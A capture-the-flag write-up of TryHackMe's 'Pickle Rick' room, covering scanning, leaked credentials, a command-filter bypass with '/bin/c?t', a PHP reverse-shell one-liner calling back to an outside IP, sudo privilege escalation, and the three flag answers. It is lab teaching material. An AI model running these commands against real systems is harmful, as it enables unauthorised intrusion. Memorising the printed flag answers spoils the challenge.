# Writeup Pickle Rick challenge (THM)

![logo_machine](https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg)

The following challenge is hosted by TryHackMe and aims at exploiting a web server in order to find three ingredients in order to help Rick, who wants to create a potion.
Let's begin.

## Website

* In source code there is this comment:
"
    Note to self, remember username!

    Username: R1ckRul3s
  "

* run nmap command:
```
nmap -sV -A -T4 10.10.38.165 -oN nmap.txt
```
Result:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-01 12:10 CEST
Nmap scan report for 10.10.38.165
Host is up (0.085s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 48:2b:8f:aa:8a:8b:0f:4c:9e:5e:ed:bc:14:89:22:39 (RSA)
|   256 a4:d6:64:ec:c4:db:82:2f:63:65:b3:e1:66:a6:91:44 (ECDSA)
|_  256 0d:8e:10:0b:cd:94:20:b4:41:21:ac:14:62:d6:8b:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
```

* in /robots.txt find string *Wubbalubbadubdub*

* connecting to port 22 (ssh) using username R1ckRul3s and passwrod Wubbalubbadubdub doesn't work (error: R1ckRul3s@10.10.38.165: Permission denied (publickey).)

* tried to find hidden files/strings in images in assets/ directory: nothing found

* run
```
nikto -h 10.10.38.165
```

* meglio gobuster con php extension:
```
gobuster -w /usr/share/wordlists/directory-list-2.3-small.txt -u http://10.10.38.165/ -t 20 -x php
```

result:

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.38.165/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2023/05/01 12:51:37 Starting gobuster
=====================================================
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)


* go to *login.php* and use credetials R1ckRul3s:Wubbalubbadubdub

![img3](/images/pickle_rick-thm/img3.png?raw=true)

## First ingredient

* run ```ls``` command in command panel and get these results:
**Sup3rS3cretPickl3Ingred.txt**
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

* we need to cat Sup3rS3cretPickl3Ingred.txt file but a filter is placed

![img4](/images/pickle_rick-thm/img4.png?raw=true)


* bypass it using the following command

![img5](/images/pickle_rick-thm/img5.png?raw=true):

```
/bin/c?t Sup3rS3cretPickl3Ingred.txt
```
first flag found: mr. meeseek hair

## Second ingredient

* read *clue.txt* file with ```/bin/c?t clue.txt``` and it states:
*Look around the file system for the other ingredient.*

* in */home/rick* there is *second ingredients* file (```ls -l /home/rick```)

* lets cat it: ```/bin/c?t "/home/rick/second ingredients"``` (fai reference a livello
  di bandit in cui spiego come si fa cat in file che contiene spazie nel nome)

  2nd ingredient: 1 jerry tear

## Third ingredient

* rev shell using php

![img6](/images/pickle_rick-thm/img6.png?raw=true):

```
php -r '$sock=fsockopen("10.8.12.35",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

* cat php files in order to understand how to open other tabs in portal.php page

* use ```sudo -l``` to priv esc, result:
```
$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-100-151.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-100-151.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
so all the commands can be run by www-data

* then:

![img8](/images/pickle_rick-thm/img8.png?raw=true)

3rd ingredient: fleeb juice
